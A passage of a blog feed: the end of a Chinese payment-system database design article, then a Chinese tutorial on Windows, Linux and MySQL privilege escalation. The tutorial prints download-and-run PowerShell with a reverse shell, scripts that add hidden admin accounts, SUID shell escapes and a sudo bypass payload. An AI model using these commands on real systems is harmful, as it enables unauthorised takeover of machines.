class="literal">NULL</span> AUTO_INCREMENT,  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式'</span>,  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'交易号'</span>,  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付成功时，该笔交易的 code'</span>,  <span class="string">`sign_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'RSA'</span> <span class="keyword">COMMENT</span> <span class="string">'采用的签名方式：MD5 RSA RSA2 HASH-MAC等'</span>,  <span class="string">`input_charset`</span> <span class="built_in">CHAR</span>(<span class="number">5</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'UTF-8'</span>,  <span class="string">`total_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'涉及的金额，无小数'</span>,  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'小数位数'</span>,  <span class="string">`pay_channel`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付渠道'</span>,  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方交易号'</span>,  <span class="string">`payment_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付时间'</span>,  <span class="string">`notify_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'paid'</span> <span class="keyword">COMMENT</span> <span class="string">'通知类型，paid/refund/canceled'</span>,  <span class="string">`notify_status`</span> <span class="built_in">VARCHAR</span>(<span class="number">7</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'INIT'</span> <span class="keyword">COMMENT</span> <span class="string">'通知支付调用方结果；INIT:初始化，PENDING: 进行中；  SUCCESS：成功；  FAILED：失败'</span>,  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_trad`</span> (<span class="string">`transaction_id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_app`</span> (<span class="string">`app_id`</span>, <span class="string">`notify_status`</span>)  <span class="keyword">INDEX</span> <span class="string">`idx_time`</span> (<span class="string">`create_at`</span>)),<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4<span class="keyword">COMMENT</span> = <span class="string">'支付调用方记录'</span>;<span class="comment">-- -----------------------------------------------------</span><span class="comment">-- Table 退款</span><span class="comment">-- -----------------------------------------------------</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_refund`</span> (  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,  <span class="string">`app_refund_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'上游的退款id'</span>,  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'交易号'</span>,  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方交易号'</span>,  <span class="string">`refund_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付平台生成的唯一退款单号'</span>,  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式'</span>,  <span class="string">`pay_channel`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'选择的支付渠道，比如：支付宝中的花呗、信用卡等'</span>,  <span class="string">`refund_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'退款金额'</span>,  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'小数位数'</span>,  <span class="string">`refund_reason`</span> <span class="built_in">VARCHAR</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'退款理由'</span>,  <span class="string">`currency_code`</span> <span class="built_in">CHAR</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'CNY'</span> <span class="keyword">COMMENT</span> <span class="string">'币种，CNY  USD HKD'</span>,  <span class="string">`refund_type`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'退款类型；0:业务退款; 1:重复退款'</span>,  <span class="string">`refund_method`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span> <span class="keyword">COMMENT</span> <span class="string">'退款方式：1自动原路返回; 2人工打款'</span>,  <span class="string">`refund_status`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'0未退款; 1退款处理中; 2退款成功; 3退款不成功'</span>,  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'请求源ip'</span>,  <span class="string">`update_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'请求源ip'</span>,  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> <span class="string">`uniq_refno`</span> (<span class="string">`refund_no`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_trad`</span> (<span class="string">`transaction_id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_status`</span> (<span class="string">`refund_status`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_ctime`</span> (<span class="string">`create_at`</span>)),<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4<span class="keyword">COMMENT</span> = <span class="string">'退款记录'</span>;</code></pre><p>表的使用逻辑进行下方简单描述：</p><p><strong>支付</strong>，首先需要记录请求日志到 <code>pay_log_data</code>中，然后生成交易数据记录到 <code>pay_transaction</code>与<code>pay_transaction_extension</code> 中。</p><p><strong>收到通知</strong>，记录数据到 <code>pay_log_data</code> 中，然后根据时支付的通知还是退款的通知，更新 <code>pay_transaction</code> 与 <code>pay_refund</code> 的状态。如果是重复支付需要记录数据到 <code>pay_repeat_transaction</code> 中。并且将需要通知应用的数据记录到 <code>pay_notify_app_log</code>，这张表相当于一个消息表，会有消费者会去消费其中的内容。</p><p><strong>退款</strong> 记录日志日志到 <code>pay_log_data</code> 中，然后记录数据到退款表中 <code>pay_refund</code>。</p><p>当然这其中还有些细节，需要大家自己看了表结构，实际去思考一下该如何使用。如果有任何疑问欢迎到我们GitHub的项目（点击阅读原文）中留言，我们都会一一解答。</p><blockquote><p>这些表能够满足最基本的需求，其它内容可根据自己的需求进行扩张，比如：支持用户卡列表、退款走银行卡等。</p></blockquote><h3 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h3><p>这部分主要说下系统该如何搭建，以及代码组织方式的建议。</p><h4 id="系统架构-1"><a href="#系统架构-1" class="headerlink" title="系统架构"></a>系统架构</h4><p>由于支付系统的安全性非常高，因此不建议将对应的入口直接暴露给用户可见。应该是在自己的应用系统中调用支付系统的接口来完成业务。另外系统对数据要求是：强一致性的。因此也没有缓存介入（当如缓存可以用来做报警，这不在本文范畴）。</p><p><img src="/articles/电商设计手册/image-20190309135800643.png" alt></p><p>具体的实现，系统会使用两个域名，一个为内部使用，只有指定来源的ip能够访问固定功能（访问除通知外的其它功能）。另一个域名只能访问 <code>notify</code> <code>return</code> 两个路由。通过这种方式可以保证系统的安全。</p><p>在数据库的使用上无论什么请求直接走 <strong>Master</strong> 库。这样保证数据的强一致。当然从库也是需要的。比如：账单、对账相关逻辑我们可以利用从库完成。</p><h4 id="代码设计"><a href="#代码设计" class="headerlink" title="代码设计"></a>代码设计</h4><p>不管想做什么最终都要用代码来实现。我们都知道需要可维护、可扩展的代码。那么具体到支付系统你会怎么做呢？我已支付为例说下我的代码结构设计思路。仅供参考。比如我要介入：微信、支付宝、招行 三家支付。我的代码结构图如下：</p><p><img src="/articles/电商设计手册/image-20190309142925499.png" alt></p><p>用文字简单介绍下。我会将每一个第三方封装成： <code>XXXGateway</code> 类，内部是单纯的封装第三方接口，不管对方是 HTTP 请求还是 SOAP 请求，都在内部进行统一处理。</p><p>另外有一层<code>XXXProxy</code> 来封装这些第三方提供的能力。这一层主要干两件事情：对传过来请求支付的数据进行个性化处理。对返回的结构进行统一处理返回上层统一的结构。当然根据特殊情况这里可以进行一切业务处理；</p><p>通过上面的操作变化已经基本上被完全封装了。如果新增一个支付渠道。只需要增加：<code>XXXGateway</code> 与 <code>XXXProxy</code>。</p><p>那么 <code>Context</code> 与 <code>Server</code> 有什么用呢？<code>Server</code> 内部封装了所有的业务逻辑，它提供接口给 action 或者其它 server 进行调用。而 <code>Context</code> 这一层存在的价值是处理 <code>Proxy</code> 层返回的错误。以及在这里进行报警相关的处理。</p><p>上面的结构只是我的一个实践，欢迎大家讨论。</p><p>本文描述的系统只是满足了最基本的支付需求。缺少相关的监控、报警。如果你按照上文设计自己的系统，风险自担与我无关。</p><h1 id="订单中心"><a href="#订单中心" class="headerlink" title="订单中心"></a>订单中心</h1><p>请您耐心等待…</p><h1 id="仓储系统"><a href="#仓储系统" class="headerlink" title="仓储系统"></a>仓储系统</h1><p>请您耐心等待…</p><h1 id="物流系统"><a href="#物流系统" class="headerlink" title="物流系统"></a>物流系统</h1><p>请您耐心等待…</p><h1 id="售后服务"><a href="#售后服务" class="headerlink" title="售后服务"></a>售后服务</h1><p>请您耐心等待…</p><h1 id="基础服务"><a href="#基础服务" class="headerlink" title="基础服务"></a>基础服务</h1><p>请您耐心等待…</p><style>.posts-expand .post-body img{margin:0 auto; max-height:100vh;}</style>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一直从事互联网电商开发三年多的时间了，回头想想却对整个业务流程不是很了解，说出去很是惭愧。但是身处互联网电商的环境中，或多或少接触了其中的各
      
    
    </summary>
    
      <category term="架构设计" scheme="http://ya2.top/categories/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>权限提升姿势</title>
    <link href="http://ya2.top/articles/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%A7%BF%E5%8A%BF/"/>
    <id>http://ya2.top/articles/权限提升姿势/</id>
    <published>2020-04-22T09:47:56.000Z</published>
    <updated>2021-06-16T02:22:47.339Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是对权限提升方法的总结，记录自己学习和复现的过程。</p><h2 id="windows篇"><a href="#windows篇" class="headerlink" title="windows篇"></a>windows篇</h2><hr><h3 id="windows溢出提权"><a href="#windows溢出提权" class="headerlink" title="windows溢出提权"></a>windows溢出提权</h3><h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ol><li><p>查看系统补丁信息</p><p>systeminfo</p></li><li><p>寻找可用exp</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">https://bugs.hacking8.com/tiquan/</a></p></li><li><p>一把梭！</p><p><img src="/articles/权限提升姿势/20200411165225-c3c910d8-7bd1-1.png" alt></p></li></ol><h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><h4 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul><li><p>启动项路径：</p><p>C:\Users\{用户名}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></li><li><p>在启动项中创建vbs或bat脚本<br>vbs：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> wshshell=<span class="built_in">createobject</span>(<span class="string">"wscript.shell"</span>)  </span><br><span class="line">a=wshshell.run(<span class="string">"cmd.exe /c net user 用户名 密码 /add"</span>,<span class="number">0</span>)  </span><br><span class="line">b=wshshell.run(<span class="string">"cmd.exe /c net localgroup administrators 用户名 /add"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>bat： </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user 用户名 密码 /add  </span><br><span class="line"><span class="built_in">net</span> localgroup administrators 用户名 /add</span><br></pre></td></tr></table></figure></li><li><p>接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启。</p></li><li><p>bat脚本运行时会有个dos弹一下，vbs不会弹，建议使用vbs脚本</p></li></ul><h3 id="UAC提权（CVE-2019-1388）"><a href="#UAC提权（CVE-2019-1388）" class="headerlink" title="UAC提权（CVE-2019-1388）"></a>UAC提权（CVE-2019-1388）</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。<br>利用该漏洞很容易就可以提升权限到SYSTEM</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>按照exp作者的描述，影响范围如下：<br>Windows 2008r2 7601 <strong>link OPENED AS SYSTEM</strong><br>Windows 2012r2 9600 <strong>link OPENED AS SYSTEM</strong><br>Windows 2016 14393 <strong>link OPENED AS SYSTEM</strong><br>Windows 2019 17763 link NOT opened<br>Windows 7 SP1 7601 <strong>link OPENED AS SYSTEM</strong><br>Windows 8 9200 <strong>link OPENED AS SYSTEM</strong><br>Windows 8.1 9600 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1511 10240 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1607 14393 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1703 15063 link NOT opened<br>Windows 10 1709 16299 link NOT opened<br>…</p><h4 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h4><ul><li><p>EXP地址<br><a href="https://github.com/jas502n/CVE-2019-1388" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-1388</a></p></li><li><p>复现环境<br>windows 7专业版  </p></li></ul><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ul><li><p>将EXP传入系统，点击下图中箭头所指的位置<br><img src="/articles/权限提升姿势/20200411165254-d5277658-7bd1-1.png" alt></p></li><li><p>点击颁发者中的超链接<br><img src="/articles/权限提升姿势/20200411165334-ed296a54-7bd1-1.png" alt></p></li><li><p>成功弹出ie，此时ie是以system权限开启<br><img src="/articles/权限提升姿势/20200411165353-f896a92e-7bd1-1.png" alt></p></li><li><p>页面另存为，输入cmd路径<br><img src="/articles/权限提升姿势/20200411165413-0422e564-7bd2-1.png" alt></p></li><li><p>权限为system<br><img src="/articles/权限提升姿势/20200411165423-0a3f593c-7bd2-1.png" alt></p></li></ul><h3 id="Juicypotato"><a href="#Juicypotato" class="headerlink" title="Juicypotato"></a>Juicypotato</h3><h4 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h4><p>在尝试windows下的一系列提权操作后都没有成功，可以尝试一下烂土豆，这里在吐司上找到一个大佬改写的juicypotato，自动化程度比原版更高，使用起来更简单，配合webshell食用可以说是非常美味。</p><h4 id="复现准备-1"><a href="#复现准备-1" class="headerlink" title="复现准备"></a>复现准备</h4><ul><li><p>一个有执行权限的webshell</p></li><li><p>大佬改版后的<a href="https://www.t00ls.net/viewthread.php?tid=47362&highlight=potato" target="_blank" rel="noopener">Juicypotato</a></p></li></ul><h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><ul><li><p>使用webshell上传烂土豆并执行命令,这里使用powershell做反弹shell  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Juicypotato.exe -p "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://ip/ps.ps1');powercat -c ip -p 444 -e cmd"</span><br></pre></td></tr></table></figure></li></ul><p>  <img src="/articles/权限提升姿势/20200411172500-519035dc-7bd6-1.png" alt></p><p>  <img src="/articles/权限提升姿势/20200411165447-18ac36fc-7bd2-1.png" alt></p><h2 id="linux篇"><a href="#linux篇" class="headerlink" title="linux篇"></a>linux篇</h2><hr><h3 id="内核溢出"><a href="#内核溢出" class="headerlink" title="内核溢出"></a>内核溢出</h3><p>平常问大佬们linux下的提权，听的最多的就是脏牛一把梭，但是目前实战还没有提成功，固这里简单叙述一下。</p><h4 id="具体步骤-2"><a href="#具体步骤-2" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul><li><p>查看内核版本</p><p>uname -a</p></li><li><p>寻找exp一把梭  </p><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p></li></ul><h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><h4 id="什么是定时任务"><a href="#什么是定时任务" class="headerlink" title="什么是定时任务"></a>什么是定时任务</h4><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。</p><ul><li><p>通过命令查看<br>crontab -l<br>注意：只能查看当前用户的定时任务</p></li><li><p>可以通过以下文件查看现有定时任务<br>/etc/crontab<br>/var/spool/cron/crontabs<br>/etc/cron.*/</p></li></ul><h4 id="提权前提"><a href="#提权前提" class="headerlink" title="提权前提"></a>提权前提</h4><ul><li><p>定时任务以root或高权限用户运行</p></li><li><p>现有较低权限用户拥有对该定时任务文件的写权限</p></li></ul><h4 id="复现准备-2"><a href="#复现准备-2" class="headerlink" title="复现准备"></a>复现准备</h4><ul><li>以root身份创建一个定时任务，定时执行py脚本<br><img src="/articles/权限提升姿势/20200411165501-20d27300-7bd2-1.png" alt></li></ul><h4 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h4><ul><li><p>假设我们获取到了一个低权限用户，查看/etc/crontab文件，发现有个以root身份运行的py脚本定时任务<br><img src="/articles/权限提升姿势/20200411165511-273211e2-7bd2-1.png" alt></p></li><li><p>发现可以对该文件进行读写，在py脚本中执行os命令反弹 shell<br><img src="/articles/权限提升姿势/20200411165518-2b512c4a-7bd2-1.png" alt></p></li><li><p>该定时任务1分钟运行一次，这里等待服务器接收shell即可<br><img src="/articles/权限提升姿势/20200411165528-3127a2c0-7bd2-1.png" alt></p></li></ul><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><h4 id="什么是suid提权"><a href="#什么是suid提权" class="headerlink" title="什么是suid提权"></a>什么是suid提权</h4><p>详细介绍可参考<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener"> P牛大大的文章 </a>，简单来说SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</p><h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><ul><li><p>查找系统中可使用root权限运行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null  </span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null  </span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;</span><br></pre></td></tr></table></figure></li><li><p>一些可用于提权的文件</p></li><li><p>Nmap(2.02-5.21)<br>nmap –interactive<br>!sh</p></li><li><p>find<br>touch pentestlab<br>find pentestlab -exec whoami \;</p></li><li><p>less/more<br>less(more) /etc/passwd<br>!/bin/sh</p></li><li><p>vim/vi<br>vim.tiny<br>:set shell=/bin/sh<br>:shell</p></li><li><p>git<br>git help config<br>!/bin/bash<br>…</p><p>印象中还有一些命令可以达到提权的效果，暂时只收集了这些。这里也是提供了一个思路，找到了能以root运行的命令之后可以去翻阅这个命令的相关参数，看能否达到shell交互的效果。</p></li></ul><h3 id="sudo权限绕过（CVE-2019-14287）"><a href="#sudo权限绕过（CVE-2019-14287）" class="headerlink" title="sudo权限绕过（CVE-2019-14287）"></a>sudo权限绕过（CVE-2019-14287）</h3><p>感觉这个漏洞实战不太会遇到，不过说不定哪天能中呢 :)</p><h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令：  </p><p><img src="/articles/权限提升姿势/20200411165550-3df2a784-7bd2-1.png" alt></p><p>通过将用户ID修改为-1（或未签名的等价用户ID-4294967295）可以绕过该配置文件限制，达到权限提升的效果。</p><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><p>sudo &lt; 1.8.28</p><h4 id="复现准备-3"><a href="#复现准备-3" class="headerlink" title="复现准备"></a>复现准备</h4><p>手动配置/etc/sudoers文件，添加内容如下：  </p><p><img src="/articles/权限提升姿势/20200411165600-445f8588-7bd2-1.png" alt></p><p>表示不允许用户xlxxlx以root身份执行任意命令，也就相当于无法使用sudo命令。</p><h4 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h4><ul><li><p>查看配置文件是否生效  </p><p><img src="/articles/权限提升姿势/20200411165607-481be09a-7bd2-1.png" alt></p><p>提示xlxxlx用户无法以root身份执行whoami</p></li><li><p>直接上payload<br>sudo -u#-1 whoami  </p><p><img src="/articles/权限提升姿势/20200411165614-4c79927c-7bd2-1.png" alt></p></li></ul><h2 id="Mysql篇"><a href="#Mysql篇" class="headerlink" title="Mysql篇"></a>Mysql篇</h2><hr><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h4 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h4><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p><h4 id="提权过程-1"><a href="#提权过程-1" class="headerlink" title="提权过程"></a>提权过程</h4><p>udf.dll文件的提取可以参考<a href="https://www.jianshu.com/p/5b34c1b6dee7" target="_blank" rel="noopener">这篇文章</a></p><ul><li><p>mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/<br>mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\</p></li><li><p>通过sql语句创建自定义命令并执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> xxx <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span>  </span><br><span class="line"><span class="keyword">select</span> xxx(<span class="string">'cmd'</span>)</span><br></pre></td></tr></table></figure></li></ul><p>这里使用一个udf提权马进行复现</p><ul><li><p>自动导出udf到目录<br><img src="/articles/权限提升姿势/20200411165633-57e31b9c-7bd2-1.png" alt></p></li><li><p>创建自定义函数并执行提权操作<br><img src="/articles/权限提升姿势/20200411165644-5eab16f0-7bd2-1.png" alt><br><img src="/articles/权限提升姿势/20200411165651-62d8549a-7bd2-1.png" alt></p></li></ul><h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><h4 id="什么是MOF提权"><a href="#什么是MOF提权" class="headerlink" title="什么是MOF提权"></a>什么是MOF提权</h4><p>mof提权的原理其实很简单，就是利用了 c:/windows/system32/wbem/mof/ 目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，我们把想要执行的cmd命令代入mof文件中即可，和linux下的定时任务提权相似。</p><h4 id="MOF代码"><a href="#MOF代码" class="headerlink" title="MOF代码"></a>MOF代码</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 